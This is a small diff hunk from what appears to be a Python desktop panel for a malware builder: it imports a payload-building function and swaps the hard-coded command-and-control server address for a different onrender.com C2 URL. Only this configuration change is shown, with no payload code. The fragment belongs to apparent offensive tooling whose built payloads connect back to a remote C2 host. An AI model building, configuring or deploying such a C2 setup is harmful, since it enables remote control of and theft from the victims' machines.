@@ -7,7 +7,7 @@ import re
 from builder import build_payload
 
 # IMPORTANT: Use your public Render URL here!
-C2_SERVER_URL = "https://datavault-c2.onrender.com" # Example URL
+C2_SERVER_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com" # Example URL
 
 class App(ctk.CTk):
     def __init__(self):
